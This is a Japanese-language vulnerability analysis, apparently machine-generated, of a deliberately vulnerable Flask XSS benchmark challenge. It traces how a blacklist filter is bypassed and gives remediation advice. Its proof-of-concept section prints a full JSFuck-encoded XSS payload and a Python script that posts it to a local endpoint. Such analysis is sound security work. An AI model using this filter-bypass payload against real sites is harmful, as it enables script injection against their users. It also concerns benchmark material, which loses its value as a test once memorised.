# Security Analysis: check.js - DOM access operations

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-010-24/src/check.js`
- **検出パターン**: DOM access operations

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `XSS`

## PAR Policy Analysis

### Principals (データ源)

- **request.form.get('name','')**: Untrusted
  - Context: POSTフォームからのユーザー入力（/pageエンドポイント）
  - Risk Factors: 直接的なユーザー制御入力, 任意のペイロードを送信可能, ブラックリストによる不完全なフィルタリング
- **system.stdin.readLine() (check.js)**: SemiTrusted
  - Context: PhantomJSスクリプトへの標準入力（app.pyから制御）
  - Risk Factors: 内部プロセス間通信だがユーザー入力由来のURLを含む

### Actions (セキュリティ制御)

- **blacklist filter (app.py:69,72-75)**: Insufficient
  - Function: 英数字と<>を含む入力を拒否
  - Weaknesses: JSFuckなどの難読化手法でバイパス可能, Unicode文字が考慮されていない, 許可リストではなく拒否リストを使用
  - Bypass Vectors: JSFuck（[]()!+のみを使用）, JJEncode、AAEncode, Unicode正規化攻撃
- **X-XSS-Protection: 0**: Bypassed
  - Function: ブラウザのXSSフィルタ（無効化）
  - Weaknesses: XSS保護が明示的に無効化されている
  - Bypass Vectors: 保護自体が無効なため、すべての攻撃が通過

### Resources (操作対象)

- **document.write() (app.py:77 内のscript_content)**: Critical
  - Operation: DOM操作・スクリプト実行
  - Protection: 不完全なブラックリストフィルタリングのみ
- **flags[0] (app.py:22,56,80)**: High
  - Operation: 機密データ（フラグ）の読み取りと表示
  - Protection: XSS成功時のみ表示（意図的な設計）

### Policy Violations

#### XSS-001: ユーザー入力がサニタイズされずにスクリプトコンテキストに挿入される

- **Path**: request.form['name'] -> blacklist(bypass可能) -> script_content内のdocument.write -> DOM実行
- **Severity**: critical
- **Confidence**: 0.90

#### SEC-HEADER-001: XSS保護ヘッダーが明示的に無効化されている

- **Path**: response.headers['X-XSS-Protection'] = '0'
- **Severity**: high
- **Confidence**: 1.00

## マッチしたソースコード

```code
document.querySelectorAll
```

## 詳細解析

**XSS脆弱性の確認（Reflected XSS / DOM-based XSS）**

このアプリケーションには**重大なXSS脆弱性**が存在します。

**脆弱なコードパス (app.py:66-83)**:
1. `/page`エンドポイントでユーザー入力`msg`がPOSTフォームから取得される
2. ブラックリスト（英小文字、英大文字、数字、`<>`）でフィルタリングされるが、**Unicode文字や特殊文字はフィルタリングされない**
3. 入力は`script_content`変数内で`document.write`に**直接挿入**される
4. **X-XSS-Protection: 0**ヘッダーが設定され、ブラウザのXSS防御が無効化

**攻撃ベクトル**:
- **JSFuck**（JavaScriptを`[]()!+`のみで記述する手法）でブラックリストをバイパス可能
- Unicode文字を使った代替表現
- 文字列エスケープ（`\"`や`\x41`などは英数字を含むため難しいが、JSFuckは可能）

**check.jsの役割**:
- PhantomJSでページを読み込み、`onAlert`、`onConfirm`、`onPrompt`イベントをリッスン
- `alert('XSS')`が実行されると「XSS」が検出され、フラグが表示される

**DOM操作部分 (document.querySelectorAll)** はcheck.js内でautofocus/onfocus属性を持つ要素を探してフォーカスイベントをディスパッチするためのものであり、これ自体は脆弱性ではありません。

## PoC（概念実証コード）

```text
# PoC: JSFuck を使用した XSS バイパス
# JSFuck は JavaScript を []()!+ の6文字のみで表現する難読化手法
# 以下は alert('XSS') の JSFuck 版

# 実際のPoCペイロード例（入力フォームに送信）:
# ";[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]])()//

# 簡略化したPoCコード（Pythonで送信）:
import requests

# JSFuckでエンコードされた alert('XSS') ペイロード
jsfuck_payload = '";<JSFuckエンコードされたalert("XSS")>//'

response = requests.post(
    'http://localhost:5000/page',
    data={'name': jsfuck_payload}
)
print(response.text)
```

## 修復ガイダンス

### 入力バリデーション (app.py:69-75)

- **Required**: ブラックリストではなくホワイトリストベースのバリデーション
- **Guidance**: 許可する文字のみを明示的に定義し、それ以外を拒否する。または、コンテキストに応じた適切なエスケープを適用する。
- **Priority**: critical

### 出力エンコーディング (app.py:77)

- **Required**: JavaScriptコンテキスト用のエスケープを適用
- **Guidance**: ユーザー入力をJavaScript文字列に挿入する際は、json.dumps()などを使用して適切にエスケープする。または、テンプレートエンジンの自動エスケープ機能を使用する。
- **Priority**: critical

### Content Security Policy

- **Required**: CSPヘッダーの追加
- **Guidance**: Content-Security-Policy: script-src 'self' を設定し、インラインスクリプトを制限する。
- **Priority**: high

### X-XSS-Protection (app.py:82)

- **Required**: XSS保護の有効化
- **Guidance**: X-XSS-Protection: 1; mode=block を設定する（ただしこれはCTFチャレンジなので意図的に無効化されている）。
- **Priority**: medium

## 解析ノート

このコードはXSSチャレンジベンチマーク用のFlaskアプリケーション。check.jsはPhantomJSでページを読み込み、alert/confirm/promptをリッスンして検出するヘルパー。主な脆弱性はapp.pyの/pageエンドポイントにある。ユーザー入力(msg)がブラックリストでフィルタリングされているが、英数字と<>のみ。しかし、JSFuckなどの非ASCII文字ベースの攻撃手法でバイパス可能。scriptタグ内のdocument.write文字列に直接挿入されている点が致命的な脆弱性。

